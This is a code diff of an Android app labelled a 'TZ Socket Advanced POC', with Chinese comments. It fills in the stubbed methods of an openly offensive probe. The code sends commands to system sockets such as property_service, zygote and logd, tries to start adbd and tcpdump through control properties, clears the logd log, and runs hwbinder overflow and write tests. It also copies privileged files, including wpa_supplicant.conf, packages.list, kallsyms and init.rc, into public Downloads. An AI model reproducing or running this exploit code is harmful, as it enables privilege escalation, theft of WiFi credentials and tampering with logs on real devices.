@@ -199,13 +199,13 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // ------------------------------------------------------------------
-    // 核心 exploit 流程（增强版）
+    // 核心 exploit 流程
     // ------------------------------------------------------------------
     private void executeExploit() {
         appendLog("========================================");
         appendLog("========== TZ Socket Advanced POC ==========");
 
-        // 1. 测试多个系统 socket（包括新增）
+        // 1. 测试多个系统 socket
         String[] targetSockets = {
                 "/dev/socket/dnsproxyd",
                 "/dev/socket/fwmarkd",
@@ -227,11 +227,11 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // 2. 深度属性服务测试（包含系统控制属性）
+        // 2. 深度属性服务测试
         appendLog("[*] Deep property service testing (system control)");
         testPropertyServiceSystemControl();
 
-        // 3. 原有信息收集
+        // 3. 信息收集
         appendLog("[*] Exploring and dumping /proc/self/fd to /sdcard/Download");
         exploreAndDumpProcFd();
 
@@ -260,7 +260,6 @@ public class MainActivity extends AppCompatActivity {
         appendLog("[*] Advanced hwbinder test using kernel structures");
         testBinderAdvanced();
 
-        // 5. ION & hwbinder 漏洞验证
         appendLog("[*] Testing direct open of /dev/ion and hwbinder with vulnerability checks");
         testIonAndHwbinder();
 
@@ -298,7 +297,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // ------------------------------------------------------------------
-    // 测试单个 socket 的通用方法
+    // 测试单个 socket
     // ------------------------------------------------------------------
     private void testSocket(String path) {
         ParcelFileDescriptor pfd = null;
@@ -351,13 +350,78 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // 各种 socket 协议测试（略，与原有类似，新增 Zygote、property_service 测试）
-    private void testDnsProxy(FileDescriptor fd) { /* 原有实现 */ }
-    private void testFwmarkd(FileDescriptor fd) { /* 原有实现 */ }
-    private void testLogd(FileDescriptor fd) { /* 原有实现 */ }
+    // ------------------------------------------------------------------
+    // Socket 协议测试
+    // ------------------------------------------------------------------
+    private void testDnsProxy(FileDescriptor fd) {
+        try {
+            byte[] query = buildDnsQuery("localhost", 1);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                int rcode = resp[3] & 0x0F;
+                appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
+            } else {
+                appendLog("[DNS] No response");
+            }
+        } catch (Exception e) {
+            appendLog("[DNS] Error: " + e.getMessage());
+        }
+    }
+
+    private void testFwmarkd(FileDescriptor fd) {
+        try {
+            ByteBuffer buf = ByteBuffer.allocate(16);
+            buf.order(ByteOrder.LITTLE_ENDIAN);
+            buf.putInt(6);
+            buf.putInt(android.os.Process.myUid());
+            buf.putInt(0);
+            buf.putInt(0);
+            byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
+            if (resp != null && resp.length == 4) {
+                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
+                appendLog("[FW] SELECT_NETWORK result=" + result);
+            } else {
+                appendLog("[FW] No/invalid response");
+            }
+        } catch (Exception e) { appendLog("[FW] Error: " + e.getMessage()); }
+
+        try {
+            ByteBuffer buf = ByteBuffer.allocate(12);
+            buf.order(ByteOrder.LITTLE_ENDIAN);
+            buf.putInt(7);
+            buf.putInt(android.os.Process.myUid());
+            buf.putInt(0);
+            byte[] resp = sendBinary(fd, buf.array(), 8, 1000);
+            if (resp != null && resp.length >= 4) {
+                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
+                appendLog("[FW] GET_NETWORK result=" + result);
+            } else {
+                appendLog("[FW] No response for GET_NETWORK");
+            }
+        } catch (Exception e) { appendLog("[FW] GET_NETWORK error: " + e.getMessage()); }
+    }
+
+    private void testLogd(FileDescriptor fd) {
+        try {
+            InputStream is = new FileInputStream(fd);
+            byte[] buf = new byte[4096];
+            int read = readBytes(is, buf, 4096, 1000);
+            if (read > 0) {
+                String str = new String(buf, 0, read, StandardCharsets.UTF_8);
+                appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
+            } else {
+                appendLog("[LOGD] No data");
+            }
+            is.close();
+        } catch (Exception e) { appendLog("[LOGD] Error: " + e.getMessage()); }
+
+        try {
+            String resp = sendTextCommand(fd, "clear\n", 500);
+            appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
+        } catch (Exception e) { appendLog("[LOGD] clear error: " + e.getMessage()); }
+    }
 
     private void testZygote(FileDescriptor fd) {
-        // Zygote 接受命令，但通常需要特殊格式，这里尝试简单握手
         try {
             String resp = sendTextCommand(fd, "status\n", 1000);
             appendLog("[ZYGOTE] status response: " + (resp != null ? resp : "(none)"));
@@ -366,13 +430,10 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // property_service 测试（更深入）
     private void testPropertyService(FileDescriptor fd) {
-        // 尝试读取属性（通过 getprop 命令？）但 property_service 是二进制协议，我们用专门方法
         appendLog("[PROPSVC] Testing property service binary protocol...");
         try {
-            // 发送获取属性命令：cmd=1, name length, name, 0 length
-            ByteBuffer buf = ByteBuffer.allocate(4 + 4 + 8 + 4); // 假设 "test.prop"
+            ByteBuffer buf = ByteBuffer.allocate(4 + 4 + 8 + 4);
             buf.order(ByteOrder.LITTLE_ENDIAN);
             buf.putInt(1); // GETPROP
             String name = "test.prop";
@@ -391,25 +452,99 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testGeneric(FileDescriptor fd, String[] cmds) { /* 原有实现 */ }
-
-    // 二进制读写辅助
-    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
-        // 原有实现
+    private void testGeneric(FileDescriptor fd, String[] cmds) {
+        for (String cmd : cmds) {
+            if (stopRequested.get()) break;
+            try {
+                String resp = sendTextCommand(fd, cmd, 1000);
+                appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+            } catch (Exception e) { appendLog("[GEN] Error on " + cmd.trim() + ": " + e.getMessage()); }
+        }
     }
-    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
-        // 原有实现
-    }
-    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) { /* 原有实现 */ }
-
-    // 构建 DNS 查询
-    private byte[] buildDnsQuery(String name, int qtype) throws Exception { /* 原有实现 */ }
 
     // ------------------------------------------------------------------
-    // 深度属性服务攻击：设置系统控制属性
+    // 文本/二进制读写辅助
+    // ------------------------------------------------------------------
+    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
+        OutputStream os = null;
+        InputStream is = null;
+        try {
+            os = new FileOutputStream(fd);
+            os.write(cmd.getBytes(StandardCharsets.UTF_8));
+            os.flush(); os.close(); os = null;
+            is = new FileInputStream(fd);
+            byte[] buf = new byte[4096];
+            int read = readBytes(is, buf, 4096, timeoutMs);
+            if (read > 0) return new String(buf, 0, read, StandardCharsets.UTF_8);
+            return null;
+        } finally {
+            if (os != null) try { os.close(); } catch (Exception ignored) {}
+            if (is != null) try { is.close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
+        OutputStream os = null;
+        InputStream is = null;
+        try {
+            os = new FileOutputStream(fd);
+            os.write(data); os.flush(); os.close(); os = null;
+            is = new FileInputStream(fd);
+            byte[] buf = new byte[maxResp];
+            int read = readBytes(is, buf, maxResp, timeoutMs);
+            if (read > 0) {
+                byte[] resp = new byte[read];
+                System.arraycopy(buf, 0, resp, 0, read);
+                return resp;
+            }
+            return null;
+        } finally {
+            if (os != null) try { os.close(); } catch (Exception ignored) {}
+            if (is != null) try { is.close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
+        int total = 0;
+        long start = System.currentTimeMillis();
+        try {
+            while (total < maxLen && System.currentTimeMillis() - start < timeoutMs) {
+                if (is.available() > 0) {
+                    int n = is.read(buffer, total, maxLen - total);
+                    if (n <= 0) break;
+                    total += n;
+                } else {
+                    Thread.sleep(20);
+                }
+            }
+            return total;
+        } catch (Exception e) {
+            return -1;
+        }
+    }
+
+    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
+        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+        baos.write(0x12); baos.write(0x34);
+        baos.write(0x01); baos.write(0x00);
+        baos.write(0x00); baos.write(0x01);
+        baos.write(0x00); baos.write(0x00);
+        baos.write(0x00); baos.write(0x00);
+        baos.write(0x00); baos.write(0x00);
+        for (String label : name.split("\\.")) {
+            baos.write(label.length());
+            baos.write(label.getBytes(StandardCharsets.US_ASCII));
+        }
+        baos.write(0);
+        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
+        baos.write(0x00); baos.write(0x01);
+        return baos.toByteArray();
+    }
+
+    // ------------------------------------------------------------------
+    // 属性服务攻击（系统控制）
     // ------------------------------------------------------------------
     private void testPropertyServiceSystemControl() {
-        // 尝试启动 adb、设置 selinux 等
         String[][] criticalProps = {
                 {"ctl.start", "adbd"},
                 {"ctl.start", "tcpdump"},
@@ -495,33 +630,558 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // ------------------------------------------------------------------
-    // 信息收集与文件遍历（原有 + 增强）
+    // 文件遍历与转储
     // ------------------------------------------------------------------
-    private void exploreAndDumpProcFd() { /* 原有实现 */ }
-    private boolean dumpFileToDownload(String sourcePath, File destFile, int maxSize) { /* 原有实现 */ }
-    private File getDumpDir() { /* 原有实现 */ }
-    private void testOomScoreAdj() { /* 原有实现 */ }
-    private void exploreSelinuxAndKptr() { /* 原有实现 */ }
-    private String safeReadFile(String path) { /* 原有实现 */ }
-    private void bruteforceSys() { /* 原有实现 */ }
-    private void bruteforceCacheAndVendor() { /* 原有实现 */ }
-    private void bruteforceProcSelf() { /* 原有实现 */ }
-    private void dumpPrivilegedFiles() { /* 原有实现 */ }
-    private void getKernelInfo() { /* 原有实现 */ }
+    private void exploreAndDumpProcFd() {
+        File dumpDir = getDumpDir();
+        if (dumpDir == null) { appendLog("[DUMP] Cannot get dump directory"); return; }
+        String[] fds = nativeListDir("/proc/self/fd");
+        if (fds == null) { appendLog("[PROC] Could not read fd directory"); return; }
 
-    // 高级 binder 测试
-    private void testBinderAdvanced() { /* 原有实现 */ }
-    private void testIonAndHwbinder() { /* 原有实现 */ }
-    private void testHwbinderOverflow() { /* 原有实现 */ }
-    private void testHwbinderWrite() { /* 原有实现 */ }
-    private void testHwbinderHal() { /* 原有实现 */ }
-    private void testHwbinderRead() { /* 原有实现 */ }
-    private void testBinderDebugfs() { /* 原有实现 */ }
-    private void testBinderDevice() { /* 原有实现 */ }
-    private void testProcFiles() { /* 原有实现 */ }
-    private void testIdCommand() { /* 原有实现 */ }
+        int maxDumpSize = 30 * 1024 * 1024;
+        for (String fdStr : fds) {
+            if (stopRequested.get()) break;
+            String link = "/proc/self/fd/" + fdStr;
+            String target = nativeReadLink(link);
+            if (target == null) continue;
 
-    private List<File> listFilesRecursive(File dir, int depth, int maxDepth) { /* 原有实现 */ }
+            appendLog("[PROC] " + link + " -> " + target);
+
+            if (!target.startsWith("pipe:") && !target.startsWith("socket:") && !target.startsWith("anon_inode:")) {
+                String content = nativeReadFile(link);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[PROC] " + link + " content (first 100): " + content.substring(0, Math.min(100, content.length())));
+                }
+                String fileName = "fd_" + fdStr + "_" + new File(target).getName() + ".bin";
+                File outFile = new File(dumpDir, fileName);
+                if (dumpFileToDownload(link, outFile, maxDumpSize)) {
+                    appendLog("[DUMP] Dumped " + link + " to " + outFile.getAbsolutePath());
+                } else {
+                    appendLog("[DUMP] Failed to dump " + link);
+                }
+            }
+        }
+    }
+
+    private boolean dumpFileToDownload(String sourcePath, File destFile, int maxSize) {
+        FileInputStream fis = null;
+        FileOutputStream fos = null;
+        try {
+            fis = new FileInputStream(sourcePath);
+            fos = new FileOutputStream(destFile);
+            byte[] buffer = new byte[65536];
+            int totalRead = 0;
+            int read;
+            while (totalRead < maxSize && (read = fis.read(buffer)) != -1) {
+                fos.write(buffer, 0, read);
+                totalRead += read;
+            }
+            return true;
+        } catch (Exception e) {
+            return false;
+        } finally {
+            try { if (fis != null) fis.close(); } catch (Exception ignored) {}
+            try { if (fos != null) fos.close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private File getDumpDir() {
+        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
+            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
+        }
+        return getFilesDir();
+    }
+
+    private void testOomScoreAdj() {
+        String path = "/proc/self/oom_score_adj";
+        String current = nativeReadFile(path);
+        appendLog("[OOM] Current oom_score_adj: " + (current != null ? current.trim() : "null"));
+
+        int[] values = {-1000, -500, 0, 500, 1000, 200, 300};
+        for (int v : values) {
+            if (stopRequested.get()) break;
+            String result = nativeWriteFile(path, String.valueOf(v));
+            if ("OK".equals(result)) {
+                String newVal = nativeReadFile(path);
+                appendLog("[OOM] Set to " + v + ", read back: " + (newVal != null ? newVal.trim() : "null"));
+            } else {
+                appendLog("[OOM] Failed to set " + v + ": " + result);
+            }
+        }
+    }
+
+    private void exploreSelinuxAndKptr() {
+        String[] paths = {
+                "/proc/kallsyms", "/proc/kptr_restrict", "/proc/self/attr/current", "/proc/self/attr/prev",
+                "/proc/self/attr/keycreate", "/proc/self/attr/exec", "/proc/self/attr/fscreate",
+                "/sys/kernel/security/", "/sys/fs/selinux/policy", "/sys/fs/selinux/status",
+                "/sys/fs/selinux/booleans/", "/sys/fs/selinux/enforce", "/sys/fs/selinux/load",
+                "/sys/kernel/debug/kptr_restrict", "/sys/kernel/security/lsm"
+        };
+        for (String p : paths) {
+            if (stopRequested.get()) break;
+            File f = new File(p);
+            if (f.isDirectory()) {
+                String[] children = nativeListDir(p);
+                if (children != null) {
+                    appendLog("[SELINUX] " + p + " (dir) entries: " + children.length + " files");
+                    for (String child : children) {
+                        if (stopRequested.get()) break;
+                        String childPath = p + (p.endsWith("/") ? "" : "/") + child;
+                        String content = safeReadFile(childPath);
+                        if (content != null && !content.isEmpty()) {
+                            appendLog("[SELINUX] " + childPath + " = " + content.substring(0, Math.min(100, content.length())));
+                        }
+                    }
+                } else {
+                    appendLog("[SELINUX] " + p + " (dir) unreadable");
+                }
+            } else {
+                String content = safeReadFile(p);
+                if (content != null) {
+                    appendLog("[SELINUX] " + p + " = " + content.substring(0, Math.min(100, content.length())));
+                } else {
+                    appendLog("[SELINUX] " + p + " (unreadable)");
+                }
+            }
+        }
+    }
+
+    private String safeReadFile(String path) {
+        try { return nativeReadFile(path); } catch (Exception e) { return null; }
+    }
+
+    private void bruteforceSys() {
+        String[] bases = {
+                "/sys/class/power_supply/battery/", "/sys/devices/system/cpu/cpu0/cpufreq/",
+                "/sys/kernel/debug/", "/sys/fs/", "/sys/class/", "/sys/devices/"
+        };
+        for (String base : bases) {
+            if (stopRequested.get()) break;
+            File dir = new File(base);
+            if (!dir.exists()) continue;
+            List<File> files = listFilesRecursive(dir, 0, 2);
+            for (File f : files) {
+                if (stopRequested.get()) break;
+                if (f.isFile() && f.canRead()) {
+                    try {
+                        String content = nativeReadFile(f.getAbsolutePath());
+                        if (content != null && !content.isEmpty()) {
+                            appendLog("[SYS] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
+                        } else {
+                            appendLog("[SYS] " + f.getAbsolutePath() + " (empty/unreadable)");
+                        }
+                    } catch (Exception e) {}
+                }
+            }
+        }
+    }
+
+    private void bruteforceCacheAndVendor() {
+        File dumpDir = getDumpDir();
+        if (dumpDir == null) return;
+
+        String[] roots = {"/cache", "/vendor/bin"};
+        for (String root : roots) {
+            if (stopRequested.get()) break;
+            File dir = new File(root);
+            if (!dir.exists()) { appendLog("[BRUTE] " + root + " does not exist"); continue; }
+            List<File> files = listFilesRecursive(dir, 0, 3);
+            for (File f : files) {
+                if (stopRequested.get()) break;
+                if (f.isFile() && f.canRead()) {
+                    try {
+                        String content = nativeReadFile(f.getAbsolutePath());
+                        if (content != null && !content.isEmpty()) {
+                            appendLog("[BRUTE] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
+                        }
+                        if (f.length() < 10 * 1024 * 1024) {
+                            String fileName = "brute_" + f.getName().replace('/', '_') + ".bin";
+                            File out = new File(dumpDir, fileName);
+                            if (dumpFileToDownload(f.getAbsolutePath(), out, 30 * 1024 * 1024)) {
+                                appendLog("[BRUTE] Dumped " + f.getAbsolutePath() + " to " + out.getAbsolutePath());
+                            }
+                        }
+                    } catch (Exception e) {}
+                }
+            }
+        }
+    }
+
+    private void bruteforceProcSelf() {
+        String[] entries = nativeListDir("/proc/self");
+        if (entries == null) { appendLog("[PROC] Could not list /proc/self"); return; }
+        for (String entry : entries) {
+            if (stopRequested.get()) break;
+            if (entry.equals("fd") || entry.equals("attr") || entry.equals("cwd") || entry.equals("root") || entry.equals("exe") || entry.equals("task")) {
+                continue;
+            }
+            String fullPath = "/proc/self/" + entry;
+            File f = new File(fullPath);
+            if (f.isFile() && f.canRead()) {
+                String content = safeReadFile(fullPath);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[PROC-SELF] " + fullPath + " = " + content.substring(0, Math.min(100, content.length())));
+                } else {
+                    appendLog("[PROC-SELF] " + fullPath + " (empty/unreadable)");
+                }
+                if (f.length() < 10 * 1024 * 1024) {
+                    File dumpDir = getDumpDir();
+                    if (dumpDir != null) {
+                        String fileName = "procself_" + entry + ".bin";
+                        File out = new File(dumpDir, fileName);
+                        dumpFileToDownload(fullPath, out, 30 * 1024 * 1024);
+                    }
+                }
+            } else if (f.isDirectory()) {
+                String[] sub = nativeListDir(fullPath);
+                if (sub != null) {
+                    appendLog("[PROC-SELF] " + fullPath + " (dir) contains " + sub.length + " entries");
+                } else {
+                    appendLog("[PROC-SELF] " + fullPath + " (dir) unreadable");
+                }
+            }
+        }
+    }
+
+    private void dumpPrivilegedFiles() {
+        File dumpDir = getDumpDir();
+        if (dumpDir == null) { appendLog("[DUMP] Cannot get dump directory"); return; }
+
+        String[] privilegedPaths = {
+                "/dev/tzdbg_qsee_log", "/dev/uid0", "/dev/diag", "/vendor/bin/sh",
+                "/system/etc/init.rc", "/vendor/etc/init.rc",
+                "/default.prop", "/system/build.prop", "/vendor/build.prop",
+                "/proc/cmdline", "/proc/version", "/proc/mounts", "/proc/filesystems",
+                "/proc/self/status", "/proc/self/stat", "/proc/self/stack", "/proc/self/wchan",
+                "/sys/kernel/security/lsm", "/sys/kernel/debug/kallsyms", "/sys/kernel/debug/binder/",
+                "/data/misc/wifi/wpa_supplicant.conf", "/data/system/packages.list", "/data/system/packages.xml"
+        };
+
+        for (String path : privilegedPaths) {
+            if (stopRequested.get()) break;
+            File f = new File(path);
+            if (f.exists() && f.canRead()) {
+                String content = safeReadFile(path);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[PRIV] " + path + " = " + content.substring(0, Math.min(200, content.length())));
+                } else {
+                    appendLog("[PRIV] " + path + " (empty/unreadable)");
+                }
+                if (f.length() < 20 * 1024 * 1024) {
+                    String fileName = "priv_" + path.replace('/', '_') + ".bin";
+                    File out = new File(dumpDir, fileName);
+                    if (dumpFileToDownload(path, out, 30 * 1024 * 1024)) {
+                        appendLog("[PRIV] Dumped " + path + " to " + out.getAbsolutePath());
+                    }
+                }
+            } else {
+                appendLog("[PRIV] " + path + " does not exist or not readable");
+            }
+        }
+    }
+
+    private void getKernelInfo() {
+        String result = nativeGetKernelInfo();
+        appendLog("[KERNEL] " + result);
+    }
+
+    // ------------------------------------------------------------------
+    // Binder & ION 测试
+    // ------------------------------------------------------------------
+    private void testBinderAdvanced() {
+        int fd = nativeOpenDevice("/dev/hwbinder");
+        if (fd < 0) {
+            appendLog("[BINDER] Failed to open /dev/hwbinder: " + fd);
+            return;
+        }
+        String result = nativeBinderAdvancedTest(fd);
+        appendLog("[BINDER] Advanced test result: " + result);
+        if (fd >= 0) {
+            try {
+                ParcelFileDescriptor.adoptFd(fd).close();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private void testIonAndHwbinder() {
+        int ionFd = nativeOpenDevice("/dev/ion");
+        appendLog("[DEV] /dev/ion open returned fd=" + ionFd);
+        if (ionFd >= 0) {
+            String info = nativeTestFd(ionFd);
+            appendLog("[DEV] /dev/ion fd info: " + info);
+            String ionResult = nativeIonTest(ionFd);
+            appendLog("[DEV] ion test result: " + ionResult);
+            try {
+                ParcelFileDescriptor.adoptFd(ionFd).close();
+            } catch (Exception ignored) {}
+        }
+
+        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
+        appendLog("[DEV] /dev/hwbinder open returned fd=" + hwbinderFd);
+        if (hwbinderFd >= 0) {
+            String info = nativeTestFd(hwbinderFd);
+            appendLog("[DEV] /dev/hwbinder fd info: " + info);
+            String hwbinderResult = nativeHwbinderTest(hwbinderFd);
+            appendLog("[DEV] hwbinder test result: " + hwbinderResult);
+            try {
+                ParcelFileDescriptor.adoptFd(hwbinderFd).close();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private void testHwbinderOverflow() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[OVERFLOW] /dev/hwbinder open returned fd=" + fd);
+            if (fd >= 0) {
+                String info = nativeTestFd(fd);
+                appendLog("[OVERFLOW] fd info: " + info);
+                String result = nativeHwbinderOverflowTest(fd);
+                appendLog("[OVERFLOW] overflow test result: " + result);
+            } else {
+                appendLog("[OVERFLOW] Failed to open /dev/hwbinder");
+            }
+        } catch (Exception e) {
+            appendLog("[OVERFLOW] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testHwbinderWrite() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[HWB_WRITE] /dev/hwbinder open fd=" + fd);
+            if (fd >= 0) {
+                String result = nativeHwbinderWriteTest(fd);
+                appendLog("[HWB_WRITE] Write test result: " + result);
+            } else {
+                appendLog("[HWB_WRITE] Failed to open /dev/hwbinder");
+            }
+        } catch (Exception e) {
+            appendLog("[HWB_WRITE] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testHwbinderHal() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[HWB_HAL] /dev/hwbinder open fd=" + fd);
+            if (fd >= 0) {
+                String result = nativeHwbinderHalCommand(fd);
+                appendLog("[HWB_HAL] HAL command result: " + result);
+            } else {
+                appendLog("[HWB_HAL] Failed to open /dev/hwbinder");
+            }
+        } catch (Exception e) {
+            appendLog("[HWB_HAL] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testHwbinderRead() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/hwbinder");
+            appendLog("[HWB_READ] /dev/hwbinder open fd=" + fd);
+            if (fd >= 0) {
+                String result = nativeHwbinderReadTest(fd);
+                appendLog("[HWB_READ] Read test result: " + result);
+            } else {
+                appendLog("[HWB_READ] Failed to open /dev/hwbinder");
+            }
+        } catch (Exception e) {
+            appendLog("[HWB_READ] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testBinderDebugfs() {
+        String[] debugFiles = {
+                "/sys/kernel/debug/binder/state",
+                "/sys/kernel/debug/binder/stats",
+                "/sys/kernel/debug/binder/transactions",
+                "/sys/kernel/debug/binder/transaction_log",
+                "/sys/kernel/debug/binder/failed_transaction_log"
+        };
+        for (String path : debugFiles) {
+            if (stopRequested.get()) break;
+            File f = new File(path);
+            if (f.exists() && f.canRead()) {
+                String content = safeReadFile(path);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[BINDER_DEBUG] " + path + " =\n" + content);
+                } else {
+                    appendLog("[BINDER_DEBUG] " + path + " (empty/unreadable)");
+                }
+            } else {
+                appendLog("[BINDER_DEBUG] " + path + " not accessible");
+            }
+        }
+
+        String sysfsBinder = "/sys/fs/binder";
+        File sysfsDir = new File(sysfsBinder);
+        if (sysfsDir.exists() && sysfsDir.isDirectory()) {
+            String[] children = nativeListDir(sysfsBinder);
+            if (children != null) {
+                appendLog("[BINDER_SYS] " + sysfsBinder + " entries: " + children.length);
+                for (String child : children) {
+                    if (stopRequested.get()) break;
+                    String childPath = sysfsBinder + "/" + child;
+                    String content = safeReadFile(childPath);
+                    if (content != null && !content.isEmpty()) {
+                        appendLog("[BINDER_SYS] " + childPath + " = " + content.substring(0, Math.min(200, content.length())));
+                    } else {
+                        appendLog("[BINDER_SYS] " + childPath + " (empty/unreadable)");
+                    }
+                }
+            } else {
+                appendLog("[BINDER_SYS] " + sysfsBinder + " unreadable");
+            }
+        } else {
+            appendLog("[BINDER_SYS] " + sysfsBinder + " does not exist");
+        }
+    }
+
+    private void testBinderDevice() {
+        int fd = -1;
+        try {
+            fd = nativeOpenDevice("/dev/binder");
+            appendLog("[BINDER_DEV] /dev/binder open returned fd=" + fd);
+            if (fd >= 0) {
+                String version = nativeBinderGetVersion(fd);
+                appendLog("[BINDER_DEV] Version info: " + version);
+
+                int cmd = 0x40046201;
+                String ioctlResult = nativeBinderIoctlTest(fd, cmd, 0);
+                appendLog("[BINDER_DEV] Ioctl test result: " + ioctlResult);
+
+                String info = nativeTestFd(fd);
+                appendLog("[BINDER_DEV] fd info: " + info);
+            } else {
+                appendLog("[BINDER_DEV] Failed to open /dev/binder");
+            }
+        } catch (Exception e) {
+            appendLog("[BINDER_DEV] Exception: " + e.getMessage());
+        } finally {
+            if (fd >= 0) {
+                try { ParcelFileDescriptor.adoptFd(fd).close(); } catch (Exception ignored) {}
+            }
+        }
+    }
+
+    private void testProcFiles() {
+        File dumpDir = getDumpDir();
+        if (dumpDir == null) { appendLog("[PROCFILES] Cannot get dump dir"); return; }
+
+        String[] procPaths = {
+                "/proc/fb", "/proc/keys", "/proc/kmsg", "/proc/misc", "/proc/iomem",
+                "/proc/locks", "/proc/swaps", "/proc/crypto", "/proc/vmstat", "/proc/cgroups",
+                "/proc/cmdline", "/proc/devices", "/proc/ioports", "/proc/loadavg",
+                "/proc/consoles", "/proc/kallsyms", "/proc/slabinfo", "/proc/buddyinfo",
+                "/proc/diskstats", "/proc/key-users", "/proc/schedstat", "/proc/kpagecount",
+                "/proc/kpageflags", "/proc/partitions", "/proc/execdomains", "/proc/sched_debug",
+                "/proc/vmallocinfo", "/proc/pagetypeinfo", "/proc/sysrq-trigger",
+                "/proc/uid_time_in_state", "/proc/self/root/init", "/proc/self/exe",
+                "/proc/sys/fs/selinux/status", "/proc/config.gz", "/proc/buddyinfo"
+        };
+
+        for (String path : procPaths) {
+            if (stopRequested.get()) break;
+            File f = new File(path);
+            boolean exists = f.exists();
+            boolean canRead = f.canRead();
+            appendLog("[PROCFILES] " + path + " exists=" + exists + ", readable=" + canRead);
+            if (exists && canRead) {
+                String content = safeReadFile(path);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[PROCFILES] " + path + " content (first 200): " + content.substring(0, Math.min(200, content.length())));
+                } else {
+                    appendLog("[PROCFILES] " + path + " (empty/unreadable)");
+                }
+                if (f.length() < 20 * 1024 * 1024) {
+                    String fileName = "proc_" + path.replace('/', '_') + ".bin";
+                    File out = new File(dumpDir, fileName);
+                    if (dumpFileToDownload(path, out, 30 * 1024 * 1024)) {
+                        appendLog("[PROCFILES] Dumped " + path + " to " + out.getAbsolutePath());
+                    } else {
+                        appendLog("[PROCFILES] Failed to dump " + path);
+                    }
+                }
+            }
+        }
+    }
+
+    private void testIdCommand() {
+        appendLog("[ID] === ID command capture ===");
+        String exePath = nativeReadLink("/vendor/bin/sh");
+        if (exePath != null) {
+            appendLog("[ID] exe path: " + exePath);
+        } else {
+            appendLog("[ID] exe path: unable to read");
+        }
+
+        String status = safeReadFile("/proc/self/status");
+        if (status != null && !status.isEmpty()) {
+            String[] lines = status.split("\n");
+            for (String line : lines) {
+                if (line.startsWith("Uid:") || line.startsWith("Gid:") || line.startsWith("Groups:")) {
+                    appendLog("[ID] " + line);
+                }
+            }
+        } else {
+            appendLog("[ID] Could not read /proc/self/status");
+        }
+
+        String cmdline = safeReadFile("/proc/self/cmdline");
+        if (cmdline != null && cmdline.length() > 0) {
+            String clean = cmdline.replace("\0", " ");
+            appendLog("[ID] cmdline: " + clean);
+        } else {
+            appendLog("[ID] cmdline: (empty)");
+        }
+
+        appendLog("[ID] === end ===");
+    }
+
+    // ------------------------------------------------------------------
+    // 递归遍历目录
+    // ------------------------------------------------------------------
+    private List<File> listFilesRecursive(File dir, int depth, int maxDepth) {
+        List<File> result = new ArrayList<>();
+        if (depth > maxDepth) return result;
+        if (dir == null || !dir.exists()) return result;
+        File[] children = dir.listFiles();
+        if (children == null) return result;
+        for (File child : children) {
+            if (stopRequested.get()) break;
+            try {
+                if (child.isDirectory()) {
+                    result.addAll(listFilesRecursive(child, depth + 1, maxDepth));
+                } else {
+                    result.add(child);
+                }
+            } catch (Exception ignored) {}
+        }
+        return result;
+    }
 
     // ------------------------------------------------------------------
     // UI 辅助
